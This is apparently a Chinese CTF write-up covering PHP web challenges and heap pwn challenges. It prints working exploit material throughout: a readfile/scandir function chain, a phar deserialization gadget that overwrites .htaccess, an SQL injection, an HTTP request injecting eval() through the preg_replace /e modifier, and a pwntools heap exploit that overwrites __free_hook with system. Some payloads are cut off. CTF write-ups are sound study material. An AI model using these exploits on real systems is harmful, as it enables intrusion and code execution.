# Web
## boring_code
### 第二层
data:// 被干掉了，只能换思路，尝试绕了一圈没啥进展，那就先绕第二层吧。
再看下题目，明确好目标，flag 在上一级目录的 index.php 里，即 ../index.php，能读文件就行了。  
fuzz 一下，得到了不少函数，但能用的很少。还有一个 readfile 能用，简单思路如下：
    readfile('../index.php')
    =>  readfile(/var/www/html/index.php);
    =>  chdir('..')  =>  readfile(end(scandir('.')));
**第一个问题** ，'.' 从何来？一般直接用 `ord()` 构造，没错，这里也用这个。  
那就可以随便玩了，再结合一下 `time()`。  
**第二个问题** ，'..' 怎么来？  
**第三个问题** ，`chdir('..')` 没地方放，它的返回值是布尔型，那就丢 `time()` 吧，虽然是 `time(void)`，但也没影响
：）。
**整理一下：**
    readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));
有人可能会觉得打中的概率太小了，那就一秒发一次，最多 256 次啊 ：）
### 第一层
正在一筹莫展的时候，叫队里师傅看了下，他随手丢了个链接出来。 **云屿师傅太强了!**  
## rss
第一部分和 boring_code 一样，构造一个 baidu.com 的跳转，让其的返回是个 RSS。
（不是我真的很想吐槽为啥跳到我的站能302，另外比较正常的做法不应该是注册一个aaaabaidu.com的域名吗喂）
尝试XXE读文件，确认可读，读到源码后确认是个裸得不能再裸的XXE转SSRF，直接打。
最终构造文件：  
RSS:
    ]>
rss222.php
                1
                /hoge
                2
                /foo
## EzCMS
常见的反序列化点：
寻找有 open 方法的内置类，得到这两个：
    SessionHandler
    ZipArchive
session 没啥用，目光聚焦到 ZipArchive，看下文档发现有戏。
生成 phar
    checker = new Profile();
        }
    }
    class Profile{
        public $username;
        public $password;
        public $admin;
        function __construct() {
            $this->admin = new ZipArchive;
            $this->username = '/var/www/html/sandbox/9931f06e1af1fd77c1e95e84443dd6f6/.htaccess';
            $this->password = ZIPARCHIVE::OVERWRITE;
        }
    }
    @unlink("test.phar");
    $phar = new Phar("test.phar");
    $phar->startBuffering();
    $phar->setStub("");
    $o = new File();
    $phar->setMetadata($o);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
把 phar 传上去后，再按老套路弄下就 OK 了。
## babyblog
edit.php
    if($_SESSION['id'] == $row['userid']){
            $title = addslashes($_POST['title']);
            $content = addslashes($_POST['content']);
            $sql->query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");
            exit("");
        }
$row['title'] 没有任何过滤，可以注入，拿到 vip 账号：wulax / 1。
发现题目本身是 PHP 5.3，又看到正则，估计考察点是 preg_replac e的 e 参数以及 %00 截断；发现disable_function
但已经被别人打fpm了，就跟别人后面直接 antsystem，就不自己打 fpm 了。
    POST /replace.php HTTP/1.1
    Host: 112.126.101.16:9999
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.8,zh-CN;q=0.5,ja;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=--------1922216787
    Content-Length: 424
    DNT: 1
    Connection: close
    Referer: http://112.126.101.16:9999/replace.php?id=685
    Cookie: PHPSESSID=4jihl1fqnuugt8eqmoinpo1t47
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache
    ----------1922216787
    Content-Disposition: form-data; name="find"
    bb%00/e
    ----------1922216787
    Content-Disposition: form-data; name="replace"
    eval($_POST['cc']);
    ----------1922216787
    Content-Disposition: form-data; name="regex"
    1
    ----------1922216787
    Content-Disposition: form-data; name="id"
    971
    ----------1922216787
    Content-Disposition: form-data; name="cc"
    var_dump(antsystem('/readflag'));
    exit;
    ----------1922216787--    
# Pwn
## ezarch
vm 结构
    struct __attribute__((packed)) __attribute__((aligned(2))) Arch
    {
        char *text;
        char *stack;
        int stack_size;
        int mem_size;
        unsigned int break[256];
        unsigned int regs[16];
        unsigned int _eip;
        unsigned int _esp;
        unsigned int _ebp;
        unsigned __int16 eflags;
    };
每条指令长度为10
    0               1               2               3               4               5               6
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |    OpCode     |     Type      |                           Operand 1                           |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                           Operand 2                           |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    or
    0               1               2               3               4
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |    OpCode     |     Type      |           Operand 1         ...
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                  ...               |           Operand 2         ...
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                  ...               |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    OpCode:
        1 -> add
        2 -> sub
        3 -> mov
        4 -> xor
        5 -> or
        6 -> and
        7 -> shift left
        8 -> shift right
        9 -> push
        10 -> pop
        11 -> call
        12 -> ret
`漏洞点`:堆溢出，输入init_size比memory_size大就行
    v8->memory = (__int64)v7;
                v9 = 0LL;
                puts("[*]Memory inited");
                printf("[*]Inited size>", argv);
                __isoc99_scanf((__int64)"%llu", (__int64)&init_sz);
                printf("[*]Input Memory Now (0x%llx)\n", init_sz);
                while ( v9 memory + v9);
                  if ( init_sz - v9 > 0xFFF )
                  {
                    v10 = read(0, v11, 0x1000uLL);
                    if ( v10 _eip;
      v2 = vmachine->size;
      if ( _eeip >= v2 || (unsigned int)vmachine->_esp >= vmachine->stack_size || v2 _ebp )
        return 1LL;
    from pwn import *
    def exp(host, port=9999):
        if host:
            p = remote(host, port)
        else:
            p = process('./ezarch', env={'LD_PRELOAD':'./libc.so'})
            gdb.attach(p, '''
                c
            ''')
        sa = p.sendafter
        ru = p.recvuntil
        rl = p.recvline
        sla = p.sendlineafter
        def Mem(size, code, eip=0, esp=0, ebp=0):
            sla('>', 'M')
            sla('>', str(size))
            sla('>', str(len(code)))
            sa(')', code)
            sla('eip>', str(eip))
            sla('esp>', str(esp))
            sla('ebp>', str(ebp))
        # mov reg[0], stack[ebp]
        opcode = '\x03\x20' + p32(0) + p32(17)
        # sub reg[0], 0x20
        opcode+= '\x02\x10' + p32(0) + p32(0x20)
        # mov stack[ebp], reg[0]
        opcode+= '\x03\x02' + p32(17) + p32(0)
        # now stack pointer to stderr, let's get it
        opcode+= '\x0a\x00' + p32(1) + p32(0)
        opcode+= '\x0a\x00' + p32(2) + p32(0)
        Mem(0x1010, opcode, 0, 0, 0x1008)
        sla('>', 'R')
        ru('R1 --> 0x')
        low = rl(keepends=False)
        ru('R2 --> 0x')
        high = rl(keepends=False)
        libc.address = int(high+low, 16) - libc.sym['_IO_2_1_stderr_']
        info("libc @ "+hex(libc.address))
        Mem(0x60, 'B')
        Mem(0x1010, '\x00'*0x1010 + p64(0) + p64(0x71) + p64(libc.sym['__free_hook']-8))
        Mem(0x60, 'B')
        Mem(0x60, '/bin/sh\x00' + p64(libc.sym['system']))
        sla('>', 'M')
        sla('>', '1')
        p.interactive()
    if __name__ == '__main__':
        elf = ELF('./ezarch', checksec=False)
        libc = ELF('./libc.so', checksec=False)
        exp(args['REMOTE'])
    # bytectf{0ccf4027c269fcbd1d0a74ddd62ba90a}
## mulnote
free的时候sleep了10秒,造成UAF
    from pwn import *
    def cmd(command):
        p.recvuntil(">")
        p.sendline(command)
    def add(sz,content):
        cmd('C')
        p.recvuntil("size>")
        p.sendline(str(sz))
        p.recvuntil("note>")
        p.send(content)
    def show():
        cmd('S')
    def dele(idx):